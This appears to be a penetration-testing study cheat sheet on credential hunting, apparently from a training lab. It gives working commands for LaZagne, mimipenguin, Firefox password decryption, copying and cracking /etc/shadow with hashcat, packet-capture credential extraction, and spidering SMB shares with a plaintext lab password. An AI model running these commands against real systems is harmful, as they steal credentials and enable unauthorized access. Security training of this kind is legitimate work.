---
title: Credential Hunting
tags: [password-attacks, credential-hunting, windows, linux, wireshark, pcredz, lazagne, mimipenguin, snaffler, manspider, network-shares]
---

# Credential Hunting

> Credential hunting means searching the filesystem, memory, network traffic, and shared drives for credentials that were stored insecurely.

## Windows Credential Hunting

### Key Terms to Search For

```
Passwords   Passphrases   Keys        Username    User account
Creds       Users         Passkeys    configuration
dbcredential  dbpassword  pwd         Login       Credentials
```

### LaZagne — Automated credential extraction

```bash
# Run all modules
start LaZagne.exe all
```

### findstr — Search file contents

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Other places to check

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts on IT shares
- `web.config` files on dev machines
- `unattend.xml` (Windows deployment files — often contain admin passwords)
- AD user/computer description fields
- KeePass databases (`.kdbx`)
- Files named `pass.txt`, `passwords.docx`, `passwords.xlsx`

---

## Linux Credential Hunting

Sources: **Files**, **History**, **Memory**, **Key-rings**

### Files

```bash
# Configuration files
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search for credentials inside .cnf files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done

# Database files
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done

# Notes (text files without extensions)
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*/

# Bash history
tail -n5 /home/*/.bash*
```

### Log Files

| File | Description |
|------|-------------|
| `/var/log/messages` | Generic system activity |
| `/var/log/syslog` | Generic system activity |
| `/var/log/auth.log` | Auth logs (Debian) |
| `/var/log/secure` | Auth logs (RedHat/CentOS) |
| `/var/log/boot.log` | Boot information |
| `/var/log/kern.log` | Kernel warnings/errors |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Cron job logs |
| `/var/log/httpd` | Apache logs |
| `/var/log/mysqld.log` | MySQL logs |

```bash
# Grep all logs for authentication events
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
  fi
done
```

### Memory and Cache

```bash
# Mimipenguin — extract credentials from memory (requires root)
sudo python3 mimipenguin.py

# LaZagne — broader credential extraction
sudo python2.7 laZagne.py all
```

LaZagne sources: WiFi, libsecret, Kwallet, Chromium, Mozilla, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, SSH, Apache, Shadow, Docker, KeePass, Sessions, Keyrings.

### Browser Credentials

```bash
# Firefox
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt with Firefox Decrypt
python3.9 firefox_decrypt.py

# Or use LaZagne
python3 laZagne.py browsers
```

### Linux Shadow / Passwd

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

---

## Credential Hunting in Network Traffic

### Wireshark Filters

| Filter | Use |
|--------|-----|
| `ip.addr == 56.48.210.13` | Filter by IP |
| `tcp.port == 80` | Filter by port |
| `http` | HTTP traffic |
| `dns` | DNS traffic |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN packets (scan detection) |
| `icmp` | ICMP/ping traffic |
| `http.request.method == "POST"` | HTTP POST (may contain creds) |
| `tcp.stream eq 53` | Specific TCP conversation |
| `eth.addr == 00:11:22:33:44:55` | Filter by MAC address |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Between two hosts |

### Pcredz — Extract credentials from captures

Extracts: credit card numbers, POP/SMTP/IMAP/FTP credentials, HTTP NTLM/Basic/Form auth, NTLMv1/v2, Kerberos AS-REQ hashes.

```bash
./Pcredz -f demo.pcapng -t -v
```

---

## Credential Hunting in Network Shares

### What to look for

- Files containing `passw`, `user`, `token`, `key`, `secret`
- Extensions: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
- Filenames with: `config`, `user`, `passw`, `cred`, `initial`
- Domain string patterns: `DOMAIN\`
- Target IT shares first — higher value than general file shares

### Snaffler (Windows — domain-joined)

```bash
Snaffler.exe -u    # include AD user list search
Snaffler.exe -i <share>  # include specific share
```

### PowerHuntShares (Windows — no domain join required)

```powershell
Set-ExecutionPolicy -Scope Process Bypass
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

Generates an HTML report for easy review.

### MANSPIDER (Linux — Docker)

```bash
docker run --rm -v ./manspider:/root/.manspider \
  blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

### NetExec Spider

```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' \
  --spider IT --content --pattern "passw"
```
